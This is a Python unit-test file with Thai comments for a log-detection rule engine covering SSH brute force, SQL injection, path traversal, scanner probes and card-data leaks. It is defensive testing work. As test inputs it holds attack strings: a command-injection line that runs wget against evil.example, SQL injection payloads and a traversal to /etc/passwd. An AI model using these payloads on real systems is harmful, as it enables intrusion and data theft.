"""
rule engine กับ log จริงจาก VPS (sshd / web access log) — phase0-report ข้อ 5 + probe เพิ่ม

รัน: cd detection && python -m unittest discover -s tests -t . -v
(ต้องมี PyYAML)
"""
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

import yaml

from app.alert_payload import build_alert
from app.rules import PRUNE_EVERY, RuleEngine

RULES = Path(__file__).parent.parent / "rules" / "security_rules.yaml"

IP_A = "203.0.113.5"
IP_B = "198.51.100.9"


T0 = datetime(2026, 10, 15, 10, 0, 0, tzinfo=timezone.utc)


def _ts(sec: int) -> str:
    return (T0 + timedelta(seconds=sec)).isoformat().replace("+00:00", "Z")


class RuleTestCase(unittest.TestCase):
    def setUp(self):
        self.engine = RuleEngine(RULES)
        self._seq = 0

    def ev(self, message, ip=IP_A, sec=None, source="vps-01", **extra):
        """event แบบที่ backend ส่งเข้า Kafka (เวลาเดินทีละวินาทีถ้าไม่ระบุ)"""
        self._seq += 1
        event = {
            "id": f"log-{self._seq}",
            "source": source,
            "sourceIp": ip,
            "eventType": "SYSLOG",
            "cdeScope": False,
            "message": message,
            "createdAt": _ts(self._seq if sec is None else sec),
        }
        event.update(extra)
        return event

    def rule_of(self, event):
        m = self.engine.evaluate(event)
        return m["rule_id"] if m else None


class StillNineRulesTest(unittest.TestCase):
    def test_rule_ids_unchanged(self):
        rules = yaml.safe_load(RULES.read_text())["rules"]
        self.assertEqual(
            [r["id"] for r in rules],
            [5710, 5715, 5820, 31100, 31151, 90001, 90002, 60001, 60002],
        )


class SshdBruteForceTest(RuleTestCase):
    """phase0 ข้อ 5 #1-#4 — เดิมไม่โดน rule ไหนเลย"""

    SSHD_FAILURES = [
        "Failed password for root from 203.0.113.5 port 52314 ssh2",
        "Failed password for invalid user admin from 203.0.113.5 port 52314 ssh2",
        "Invalid user admin from 203.0.113.5 port 52314",
        # forwarder ส่ง message หลัง masking — IP ใน message กลายเป็น .xxx ผลต้องเหมือนกัน
        "Failed password for root from 203.0.113.xxx port 52314 ssh2",
        "sshd[1234]: Invalid user oracle from 203.0.113.xxx port 40022",
    ]

    def test_each_sshd_failure_line_triggers_5710_on_the_fifth(self):
        for line in self.SSHD_FAILURES:
            with self.subTest(line=line):
                self.setUp()
                results = [self.rule_of(self.ev(line)) for _ in range(5)]
                self.assertEqual(results, [None, None, None, None, 5710])

    def test_lines_that_are_not_failed_attempts_do_not_count(self):
        for line in [
            "Connection closed by invalid user admin 203.0.113.5 port 52314 [preauth]",
            "Disconnected from invalid user admin 203.0.113.5 port 52314 [preauth]",
        ]:
            with self.subTest(line=line):
                self.setUp()
                self.assertEqual([self.rule_of(self.ev(line)) for _ in range(6)], [None] * 6)

    def test_5710_alert_carries_ip_and_the_window_logs(self):
        events = [self.ev(self.SSHD_FAILURES[0]) for _ in range(5)]
        matches = [self.engine.evaluate(e) for e in events]
        m = matches[-1]
        self.assertEqual(m["rule_id"], 5710)
        self.assertEqual(m["source_ip"], IP_A)
        self.assertEqual(m["related_log_ids"], [e["id"] for e in events])
        self.assertNotIn("prior_log_ids", m)

    def test_accepted_publickey_after_5710_from_same_ip_is_5715(self):
        failures = [self.ev(self.SSHD_FAILURES[0]) for _ in range(5)]
        for e in failures:
            self.engine.evaluate(e)
        ok = self.ev("Accepted publickey for kan from 203.0.113.5 port 52320 ssh2: ED25519 SHA256:xxxx")
        m = self.engine.evaluate(ok)
        self.assertEqual(m["rule_id"], 5715)
        self.assertEqual(m["source_ip"], IP_A)
        self.assertEqual(m["related_log_ids"], [ok["id"]])
        self.assertEqual(m["prior_log_ids"], [e["id"] for e in failures])

    def test_accepted_password_and_keyboard_interactive_also_chain(self):
        for line in [
            "Accepted password for root from 203.0.113.5 port 52320 ssh2",
            "Accepted keyboard-interactive/pam for root from 203.0.113.5 port 52320 ssh2",
        ]:
            with self.subTest(line=line):
                self.setUp()
                for _ in range(5):
                    self.engine.evaluate(self.ev(self.SSHD_FAILURES[0]))
                self.assertEqual(self.rule_of(self.ev(line)), 5715)

    def test_accepted_without_prior_failures_is_nothing(self):
        # phase0 ข้อ 5 #4 แบบเดี่ยว ๆ — login ปกติ
        self.assertIsNone(self.rule_of(self.ev("Accepted publickey for kan from 203.0.113.5 port 52320 ssh2")))


class PerIpGroupingTest(RuleTestCase):
    FAIL = "Failed password for root from 203.0.113.xxx port 52314 ssh2"

    def test_five_from_a_and_five_from_b_are_two_separate_5710_alerts(self):
        matches = []
        for i in range(5):
            for ip in (IP_A, IP_B):
                m = self.engine.evaluate(self.ev(self.FAIL, ip=ip))
                if m:
                    matches.append(m)
        self.assertEqual([(m["rule_id"], m["source_ip"]) for m in matches], [(5710, IP_A), (5710, IP_B)])
        a_ids, b_ids = (set(m["related_log_ids"]) for m in matches)
        self.assertEqual(len(a_ids), 5)
        self.assertEqual(len(b_ids), 5)
        self.assertFalse(a_ids & b_ids)

    def test_four_from_each_ip_on_the_same_source_is_not_brute_force(self):
        # เดิมนับตาม source: 8 ครั้งรวมกัน → 5710 ทั้งที่ไม่มี IP ไหนถึง 5
        results = [self.rule_of(self.ev(self.FAIL, ip=ip)) for _ in range(4) for ip in (IP_A, IP_B)]
        self.assertEqual(results, [None] * 8)

    def test_success_from_a_different_ip_after_5710_is_not_5715(self):
        for _ in range(5):
            self.engine.evaluate(self.ev(self.FAIL, ip=IP_A))
        ok = self.ev("Accepted publickey for kan from 198.51.100.xxx port 1 ssh2", ip=IP_B)
        self.assertIsNone(self.rule_of(ok))

    def test_without_source_ip_falls_back_to_source(self):
        results = [self.rule_of(self.ev(self.FAIL, ip=None)) for _ in range(5)]
        self.assertEqual(results, [None, None, None, None, 5710])
        # คนละ source ไม่ปนกัน
        self.assertIsNone(self.rule_of(self.ev("login success", ip=None, source="other")))
        self.assertEqual(self.rule_of(self.ev("login success", ip=None)), 5715)

    def test_failures_outside_the_window_do_not_add_up(self):
        results = [self.rule_of(self.ev(self.FAIL, sec=s)) for s in (0, 20, 40, 61, 81)]
        self.assertEqual(results, [None] * 5)

    def test_idle_actors_are_pruned(self):
        self.engine.evaluate(self.ev(self.FAIL, ip="192.0.2.1", sec=0))
        key = (5710, ("ip", "192.0.2.1"))
        self.assertIn(key, self.engine._event_history)
        # PRUNE_EVERY event ต่อมา ห่างเกิน window ที่ยาวที่สุด (300 วิ)
        for _ in range(PRUNE_EVERY):
            self.engine.evaluate(self.ev("GET / HTTP/1.1 200", sec=3600))
        self.assertNotIn(key, self.engine._event_history)


class WebAccessLogTest(RuleTestCase):
    """phase0 ข้อ 5 #5-#8"""

    def test_env_probe_with_zgrab_is_60001(self):
        self.assertEqual(self.rule_of(self.ev('GET /.env HTTP/1.1 404 "Mozilla/5.0 zgrab/0.x"')), 60001)

    def test_double_dot_traversal_is_60002_not_31151(self):
        self.assertEqual(self.rule_of(self.ev('GET /../../etc/passwd HTTP/1.1 400 "curl/8.0"')), 60002)

    def test_url_encoded_union_select_is_31100(self):
        line = 'GET /index.php?id=1%20UNION%20SELECT%201,2 HTTP/1.1 200 "sqlmap/1.7"'
        m = self.engine.evaluate(self.ev(line))
        self.assertEqual(m["rule_id"], 31100)
        # สำเนาที่ decode ใช้ match อย่างเดียว — message ใน alert ยังเป็นของเดิม
        self.assertEqual(m["matched_message"], line)

    def test_plus_encoded_and_quote_encoded_sqli_is_31100(self):
        for line in [
            'GET /item?id=1+UNION+SELECT+null,null HTTP/1.1 200 "Mozilla/5.0"',
            'GET /login?u=admin%27%20OR%201%3D1-- HTTP/1.1 200 "Mozilla/5.0"',
        ]:
            with self.subTest(line=line):
                self.assertEqual(self.rule_of(self.ev(line)), 31100)

    def test_plain_get_is_nothing(self):
        self.assertIsNone(self.rule_of(self.ev('GET / HTTP/1.1 200 "Mozilla/5.0 (Windows NT 10.0)"')))

    def test_scanner_user_agents_and_probe_paths_are_60001(self):
        for line in [
            'GET / HTTP/1.1 400 "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"',
            'GET /robots.txt HTTP/1.1 404 "Mozilla/5.0 (compatible; Nuclei - Open-source project)"',
            'GET /admin HTTP/1.1 404 "gobuster/3.6"',
            'GET /.git/config HTTP/1.1 404 "Mozilla/5.0"',
            'GET /wp-login.php HTTP/1.1 404 "Mozilla/5.0"',
            'GET /wp-admin/setup-config.php HTTP/1.1 404 "Mozilla/5.0"',
            'GET /.env.bak HTTP/1.1 404 "Mozilla/5.0"',
        ]:
            with self.subTest(line=line):
                self.assertEqual(self.rule_of(self.ev(line)), 60001)

    def test_lookalike_paths_are_not_probes(self):
        for line in [
            'GET /.environment/status HTTP/1.1 200 "Mozilla/5.0"',
            'GET /static/app.github.js HTTP/1.1 200 "Mozilla/5.0"',
        ]:
            with self.subTest(line=line):
                self.assertIsNone(self.rule_of(self.ev(line)))

    def test_command_injection_still_31151(self):
        self.assertEqual(self.rule_of(self.ev("GET /ping?host=8.8.8.8; wget http://evil.example/x.sh")), 31151)


class CardDataWordBoundaryTest(RuleTestCase):
    def test_words_containing_pan_or_card_do_not_match(self):
        for line in [
            "session opened by company panel",
            "expand the dashboard sidebar",
            "user logged in from Japan",
            "discarded stale cache entries",
        ]:
            with self.subTest(line=line):
                self.assertIsNone(self.rule_of(self.ev(line)))

    def test_masked_pan_and_card_words_still_match(self):
        for line in [
            "card [PAN] masked",
            "export contains [PAN] for customer 1002",
            "CVV check failed for order 42",
            "cardholder name updated",
            "3 cards on file",
        ]:
            with self.subTest(line=line):
                self.assertEqual(self.rule_of(self.ev(line)), 90001)


class DemoAllRulesStillHitTest(RuleTestCase):
    """ข้อความใน scripts/demo-all-rules.sh (DR-01..10) — ต้องยังโดน rule เดิมทุกข้อ"""

    IP = "203.0.113.77"

    def test_demo_messages(self):
        demo = [
            ("user jdoe opened the reports page", "USER_ACTIVITY", False, [None]),
            ("authentication failed for user jdoe - invalid credentials", "AUTH_FAILURE", False,
             [None, None, None, None, 5710, 5710]),
            (f"login success for user jdoe from {self.IP}", "AUTH_SUCCESS", False, [5715]),
            ("user jdoe ran sudo -u root /bin/bash outside change window", "PRIV_ESC", False, [5820]),
            ("GET /products?id=5 UNION SELECT username,password FROM users", "WEB_REQUEST", False, [31100]),
            ("GET /ping?host=8.8.8.8; wget http://evil.example/x.sh", "WEB_REQUEST", False, [31151]),
            ("report export contains card number [PAN] for customer 1002", "DATA_ACCESS", False, [90001]),
            ("tokenised record read by billing service for settlement", "CARD_ACCESS", True, [90002]),
            ("GET /admin HTTP/1.1 User-Agent: sqlmap/1.7.2#stable", "WEB_REQUEST", False, [60001]),
            ("GET /download?file=../etc/passwd", "WEB_REQUEST", False, [60002]),
        ]
        for message, event_type, cde, expected in demo:
            got = [
                self.rule_of(self.ev(message, ip=self.IP, source="rule-demo", eventType=event_type, cdeScope=cde))
                for _ in expected
            ]
            self.assertEqual(got, expected, message)


class AlertPayloadTest(unittest.TestCase):
    EVENT = {
        "id": "log-9",
        "source": "vps-01",
        "sourceIp": IP_A,
        "eventType": "SYSLOG",
        "cdeScope": False,
        "message": "Accepted publickey for kan",
    }

    def test_existing_fields_unchanged_and_ids_added(self):
        detection = {
            "rule_id": 5715,
            "description": "Successful login after multiple failures",
            "severity": "WARNING",
            "cde_alert": False,
            "source_ip": IP_A,
            "related_log_ids": ["log-9"],
            "prior_log_ids": ["log-1", "log-2"],
        }
        topic, alert = build_alert(self.EVENT, "RULE_MATCH", detection, {"ip": IP_A})
        self.assertEqual(topic, "alerts.raw")
        self.assertEqual(
            {k: alert[k] for k in ("log_id", "source", "source_ip", "alert_type", "severity", "cde_scope", "title")},
            {
                "log_id": "log-9",
                "source": "vps-01",
                "source_ip": IP_A,
                "alert_type": "RULE_MATCH",
                "severity": "WARNING",
                "cde_scope": False,
                "title": "Successful login after multiple failures",
            },
        )
        self.assertEqual(
            alert["detail"],
            {
                "rule_id": 5715,
                "reason": "Successful login after multiple failures",
                "confidence": None,
                "sequence_length": None,
                "log_message": "Accepted publickey for kan",
                "event_type": "SYSLOG",
                "ip_intel": {"ip": IP_A},
            },
        )
        self.assertEqual(alert["related_log_ids"], ["log-9"])
        self.assertEqual(alert["prior_log_ids"], ["log-1", "log-2"])

    def test_ml_alert_defaults_to_the_triggering_log(self):
        topic, alert = build_alert(
            dict(self.EVENT, cdeScope=True), "ML_ANOMALY", {"confidence": 0.9, "reason": "x"}, {}
        )
        self.assertEqual(topic, "alerts.cde")
        self.assertEqual(alert["related_log_ids"], ["log-9"])
        self.assertEqual(alert["prior_log_ids"], [])


if __name__ == "__main__":
    unittest.main()
